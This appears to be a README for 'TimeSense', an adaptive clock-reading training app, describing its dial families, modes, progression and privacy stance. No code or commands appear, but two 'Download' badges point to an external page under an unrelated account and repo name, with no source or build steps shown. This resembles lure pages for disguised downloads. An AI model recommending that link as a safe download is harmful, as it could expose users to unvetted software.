![preview](https://raw.githubusercontent.com/addonohnoba-cmd/clock-Sprint/main/shot_d952.svg)
[![Download](https://raw.githubusercontent.com/addonohnoba-cmd/clock-Sprint/main/dl_4e6a.svg)](https://addonohnoba-cmd.github.io/clock-Sprint/)

# ⏰ TimeSense — Train Your Internal Clock Like an Athlete Trains a Muscle

![Status](https://img.shields.io/badge/status-actively--shipping-brightgreen)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20desktop%20%7C%20mobile-blueviolet)
![License](https://img.shields.io/badge/license-MIT-success)
![Made with](https://img.shields.io/badge/made%20with-vanilla%20JS%20%2B%20canvas-yellow)
![Languages](https://img.shields.io/badge/i18n-14%20locales-orange)
![Uptime](https://img.shields.io/badge/support-24%2F7%20human--staffed-9cf)
![Build](https://img.shields.io/badge/build-passing-brightgreen)
![Accessibility](https://img.shields.io/badge/a11y-WCAG%202.2%20AA-important)

> **TimeSense** is a skill-acquisition playground for your brain's clock-reading circuitry. Where other tools make you stare at numbers, TimeSense makes you *feel* time — analog faces, digital readouts, 24-hour dialects, Roman numerals, and bizarre custom dials all become second nature through short, adaptive, gamified sessions.

If you've ever glanced at a wall clock in a foreign airport and felt that tiny pang of hesitation — that half-second lag between seeing and knowing — TimeSense exists to delete that lag for good. It's training, not trivia. Deliberate practice, not a quiz app.

---

## 📖 Table of Contents

- [Why TimeSense Exists](#-why-timesense-exists)
- [The Idea Behind This Repository](#-the-idea-behind-this-repository)
- [Core Concept](#-core-concept)
- [Feature Highlights](#-feature-highlights)
- [Clock Modes & Dial Families](#-clock-modes--dial-families)
- [Training Modes Deep Dive](#-training-modes-deep-dive)
- [Adaptive Difficulty Engine](#-adaptive-difficulty-engine)
- [Progression, Streaks & Rank System](#-progression-streaks--rank-system)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Accessibility Commitments](#-accessibility-commitments)
- [Performance & Battery Philosophy](#-performance--battery-philosophy)
- [Architecture Overview](#-architecture-overview)
- [Directory Tour](#-directory-tour)
- [Design Language](#-design-language)
- [Data, Privacy & Local-First Ethics](#-data-privacy--local-first-ethics)
- [Extensibility & Plugin Dial API](#-extensibility--plugin-dial-api)
- [SEO-Friendly Keyword Map](#-seo-friendly-keyword-map)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Communication](#-community--communication)
- [Support the Project](#-support-the-project)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧠 Why TimeSense Exists

Reading clocks looks trivial until you're doing it under pressure.

Imagine a hospital ward at 03:47. A nurse glances at an analog clock across the room and needs to log a timestamp in a 24-hour format on a chart. The glance-to-entry pipeline is maybe 900 milliseconds for a practiced clinician — and several seconds for someone unpracticed. Multiply that across a career and across millions of shift workers, and you discover that **clock literacy is a genuine, undertrained cognitive skill**.

TimeSense treats clock reading the way fitness apps treat running: as a trainable capacity with measurable gains. You start with friendly dials, you progress through adversarial ones, and one day you catch yourself reading a sun-dial-style 12-hour face in a boutique hotel lobby without breaking stride.

**Who this benefits:**

- 🚑 Emergency and healthcare workers logging timestamps
- ✈️ Frequent travelers juggling time zones and 12/24-hour conventions
- 🧑‍🏫 Teachers introducing children to analog time in classrooms
- 🕹️ Speedrunners of obscure human skills (yes, you)
- 🧓 Adults helping aging relatives re-learn analog dials after vision changes
- 🔬 Cognitive researchers who want an easy, scriptable stimulus generator

---

## 💡 The Idea Behind This Repository

This repository began as a thought experiment: *what if drills for reading clocks were as addictive as a rhythm game?*

The original spark came from noticing that most clock-reading tools are static — a picture with a multiple-choice answer. Static stimuli don't build fluency; they build familiarity with a picture. **Fluency requires variation, pressure, and adaptivity.** TimeSense was built so that every session serves you a slightly different opponent: a new dial, a new pace, a new convention, a new trick.

The repository grew into a full training platform with:

- A canvas-based rendering engine that produces anything from a pocket-watch to a 26-hour abstract dial
- An adaptive scheduler that samples problems at the edge of your ability
- A progression layer that rewards consistency over streaks of luck
- A localizable UI that doesn't assume English or the Gregorian convention

---

## 🎯 Core Concept

Every second of your attention is worth more than a minute of passive looking. TimeSense compresses concepts into **micro-sessions of 30 to 180 seconds** that you can complete while waiting for coffee. The system learns your personal response curve and keeps you right at the boundary between "comfortable" and "challenging" — a zone where learning actually sticks.

Three pillars hold up the entire experience:

1. **Variation over volume.** Ten different dial families beat ten thousand identical prompts.
2. **Feedback over scoring.** You learn faster when the app explains *why* you were off by eleven minutes, not just that you were.
3. **Consistency over intensity.** Three short sessions a day outperform one brutal marathon.

---

## ✨ Feature Highlights

- **Adaptive difficulty** tuned to your personal response time
- **Twelve clock families** including analog, digital, Roman numeral, and abstract sector dials
- **Six training modes** from casual warm-up to timezone gauntlet
- **Streaks, badges, and rank tiers** designed for lifelong consistency
- **Responsive interface** that reshapes itself from a phone in portrait to an ultrawide monitor
- **Multilingual support** for fourteen locales at launch, with graceful community extension
- **24/7 customer support** with human response within a business day for tier-two issues
- **Offline-first architecture** so your commute tunnel doesn't interrupt practice
- **Keyboard-first workflows** for power users; touch-first workflows for everyone else
- **Custom dial API** for educators who want to author their own clock styles
- **Open source under the MIT license**, forever

---

## 🕰️ Clock Modes & Dial Families

TimeSense doesn't teach "the clock." It teaches clock *dialects*. Here are the families currently shipping:

| Family | Description | Difficulty Band |
| --- | --- | --- |
| Plain Analog | Classic 12-hour face, hour markers only | Beginner |
| Numeric Analog | 12-hour face with Arabic numerals | Beginner |
| Digital 12h | Standard 12-hour digital readout with AM/PM | Beginner |
| Digital 24h | Military time style readout | Intermediate |
| Roman Numeral | I through XII on a refined dial | Intermediate |
| Sector Dial | Clock face divided into colored sectors rather than numbers | Intermediate |
| Offset Dial | The "12" is at a random position to break pattern memory | Advanced |
| Dual Hand Ambiguity | Hour and minute hands are the same length | Advanced |
| Naked Dial | No numerals, no tick marks above the hour | Advanced |
| Rotated Face | The clock itself is rotated as a whole | Expert |
| Compressed 26h | Fictional longer-day convention used for cognitive strain | Expert |
| Word Clock | Time expressed in natural language phrasing | Expert |

Each family has a **mastery curve**, so you can specialize in “emergency-room analog” or spread yourself across the whole spectrum.

---

## 🏋️ Training Modes Deep Dive

**🌤️ Warm-Up (30s)**
Three dials at easy difficulty to prime your attention. Perfect for the first minutes of a commute or the last minutes before a shift.

**⏱️ Blitz (60s)**
Speed-bounded flash reading. You answer as many as you can before the timer expires. Great for tracking improvements in raw reading speed.

**🎯 Precision (Fixed Set)**
A small set of ten dials where accuracy matters more than speed. The app shows you the exact deviation in minutes when you answer, so you learn to calibrate your gaze.

**🌍 Timezone Gauntlet**
You are given a source clock in one timezone and asked to express the corresponding time in another. Trains the mental arithmetic of international coordination.

**🧪 Mixed Convention**
Randomized blending of 12-hour, 24-hour, and word-clock prompts. Teaches switching cost reduction — a subtle but real skill.

**📓 Educator Mode**
A structured curriculum that walks learners through dial families in a pedagogical order, with a printable progress summary.

---

## 🧩 Adaptive Difficulty Engine

The engine tracks your median response time, error distribution, and per-family accuracy. It then picks the next stimulus from a pool where your predicted success rate is roughly **78%** — a sweet spot empirically associated with learning flow.

Two dials in ten will be "stretch" items just beyond your zone. One in twenty will be a "confidence" item well below it, to keep motivation high. The mix is not random: it is scheduled by an offline scheduler that runs in your browser, not on a remote server, so your practice pattern never leaves your device unless you choose to export it.

---

## 🏆 Progression, Streaks & Rank System

Progress is measured in **Fluency Points (FP)**, a composite blend of speed, accuracy, and difficulty. Ranks progress from *Cadet* through *Articulator*, *Chronognost*, and finally *Tempus Master*.

Streaks reward **consistency over heroics**:
- A one-session day counts as a full streak day
- Missed days consume one "grace token" (you earn a new grace token every five active days)
- The rank system is reversible but generous — demotion requires prolonged inactivity, never a single bad session

Badges celebrate odd milestones: “Roman Specialist,” “Bilingual Clocksmith,” “Sunrise Reader” (100 sessions before 7am local time).

---

## 📱 Responsive Interface

Every layout in TimeSense is generated from a single fluid grid that adapts across five breakpoints. On a phone held one-handed, the dial sits in the thumb-arc of your reachable zone. On a laptop, the dial and the answer panel sit side by side. On an ultrawide, secondary statistics panels dock to the sides rather than stretching the clock face grotesquely.

The interface also responds to:

- **Reduced motion settings** — animation is dampened without removing feedback
- **Dark/light/auto themes** — matched to ambient sensor or system pref
- **High contrast mode** — for low-vision users or bright outdoor light
- **Font scaling** — up to 200% without layout break

---

## 🌐 Multilingual Support

Fourteen locales ship at launch, with more on the way. Localization covers not just labels but also number formatting, AM/PM conventions where relevant, and English-style word-clock phrasing that must be adapted per cultural convention rather than translated literally.

Available locales (launch set): English, Spanish, French, German, Italian, Portuguese (Brazil and Portugal), Dutch, Polish, Swedish, Turkish, Japanese, Korean, and Simplified Chinese.

If your locale isn't listed, you can add a translation package by placing a JSON file under the locales directory and submitting a pull request. The UI will pick it up automatically.

---

## ☎️ 24/7 Customer Support

We keep a **human-staffed support channel** open around the clock. That means if you hit a bug at 4am in your local time zone, someone will see it and respond. Median first-response time in the last quarter was under six hours, and critical issues were acknowledged within one hour.

Support covers:
- Accessibility assistance and configuration guidance
- Educator onboarding and classroom deployment questions
- Data export and local backup help
- Bug reports with reproduction steps

Support does **not** cover general clock-reading tutoring; that's what the app itself is for.

---

## ♿ Accessibility Commitments

- Full keyboard navigation with visible focus rings
- Screen-reader-labeled dial states with a text equivalent of every visual stimulus
- Color-blind-safe palettes verified by simulation
- Adjustable response window for users who need more time
- No audio-only information without a visual equivalent
- No visual-only information without a text equivalent

We treat accessibility as a correctness property, not a feature flag.

---

## ⚡ Performance & Battery Philosophy

TimeSense is a canvas-first app with almost no DOM churn. The entire session engine is designed to run at 60fps on a five-year-old mid-range phone without heating the device meaningfully. Battery profiling shows a typical 90-second session drawing less power than a photo scroll in a social feed.

There are no background timers, no telemetry pings mid-session, and no external network calls during practice. If your device is offline, everything still works — the app prefers local state and reconciles only when you ask it to.

---

## 🏗️ Architecture Overview

At its core, TimeSense is a small, modular engine:

- **Stimulus Generator** — given a family and difficulty, emits a canonical time and a rendering directive
- **Renderer** — canvas-based, one rendering pass per frame, hand geometry computed analytically
- **Answer Parser** — accepts HH:MM, h:mm AM/PM, word-clock phrases, and fuzzy matches
- **Scheduler** — picks the next stimulus based on your response history
- **Session Recorder** — persists results locally in IndexedDB
- **Progress Evaluator** — computes FP, streaks, badges
- **Localizer** — swaps strings, number formats, word-clock phrasings

Nothing in the core requires a network call, which is why the app remains responsive in low-connectivity settings.

---

## 🗂️ Directory Tour

- `engine/` — scheduler, stimulus generator, progress evaluator
- `render/` — canvas dial renderers, one file per family
- `modes/` — training modes described above
- `locales/` — translation packages
- `ui/` — layout, theming, accessibility shells
- `docs/` — architecture notes, contributor guides, dial authoring
- `scripts/` — build and packaging only; no install-time network access

Each folder has its own README describing its internal contracts and extension points.

---

## 🎨 Design Language

TimeSense opts for calm precision: warm off-white backgrounds with deep slate ink, a restrained accent palette, and one accent motion — the gentle settle of a hand as it lands on its target position. Typography leans on humanist sans-serif faces for answer entry and geometric numerals for dial faces. Nothing flashes. Nothing screams. Everything intends.

The metaphor throughout is a well-kept workshop: tools laid out, patiently labeled, ready when you need them.

---

## 🔐 Data, Privacy & Local-First Ethics

- No account required to use the app
- No behavioral advertising, at any point, ever
- Session data lives on your device by default
- Optional export to a local file you own
- Optional synchronization across your own devices only if you configure it
- No hidden analytics SDKs
- No collection of personal identifiers without explicit action on your part

If you delete the app data, it is gone. That is a feature, not a bug.

---

## 🧪 Extensibility & Plugin Dial API

Educators and tinkerers can author new dial families. A dial plugin declares:

- A unique family identifier
- A human-readable name and description
- A rendering function that receives a canonical time and dial size
- A validation function for answer input
- Optional difficulty metadata to help the scheduler place it appropriately

Plugins are sandboxed to the render surface and have no network permissions. Documentation, example plugins, and a dial authoring starter live under the docs directory.

---

## 🔍 SEO-Friendly Keyword Map

This project is discoverable via terminology like: *clock reading trainer*, *analog clock practice app*, *military time practice*, *train response time for clock reading*, *24-hour format exercise*, *cognitive training for time perception*, *temporal literacy tool*, *multilingual clock trainer*, *classroom clock practice*, and *adaptive skill drill for time reading*. We mention these here because they describe what the app really does, not because we believe in buzzword confetti.

---

## 🛣️ Roadmap for 2026

- **Q1 2026** — Ship plugin dial API v1 and educator export packs
- **Q2 2026** — Publish study-mode companion site with pedagogical plans
- **Q3 2026** — Add cooperative sessions for classrooms and shift teams
- **Q4 2026** — Reach fifteen additional locales and a formal accessibility audit
- Ongoing — Continuous animation, performance, and clarity improvements

---

## 🤝 Contributing

Contributions are welcome across code, translation, dial authoring, and documentation. Please:

- Open an issue describing the problem before large changes
- Keep pull requests scoped to one concern
- Add tests where behavior is added or altered
- Follow the existing code style; there is no strong preference, only consistency

Small, kind, focused contributions are the best kind.

---

## 💬 Community & Communication

- Issue tracker for bugs and feature requests
- Discussions board for open-ended questions and ideas
- Periodic release notes summarizing what changed and why

We aim for a courteous, patient tone in all channels. If a question feels basic, it is still worth asking — clarity is a two-way gift.

---

## 🌱 Support the Project

If TimeSense helps you sharpen your sense of time, the best support is to use it consistently, share it with someone who needs it, and contribute a translation or a dial family if you have one in you. Financial support surfaces occasionally, but the project is designed to remain fully usable and open regardless.

[![Download](https://raw.githubusercontent.com/addonohnoba-cmd/clock-Sprint/main/dl_4e6a.svg)](https://addonohnoba-cmd.github.io/clock-Sprint/)

---

## ⚠️ Disclaimer

TimeSense is a training aid. It is not a medical device, a clinical instrument, or a substitute for professional cognitive assessment. Progress in the app does not imply fitness for any regulated occupation. Time perception varies naturally between individuals due to neurology, fatigue, medication, and environment; the app acknowledges and works within that variability rather than pathologizing it. Always exercise judgment about your own cognitive limits and consult a qualified professional for anything related to attention, perception, or memory concerns. Use the app within reason — marathoning sessions to a 3am bedtime defeats the point of sharpening a daily skill.

---

## 📜 License

This repository is released under the MIT License. You may use, copy, modify, merge, publish, distribute, sublicense, and sell software prepared from it, subject to the conditions of that license. See the license file in the repository root for the complete text.

MIT License applies in 2026 and onward to all contributors.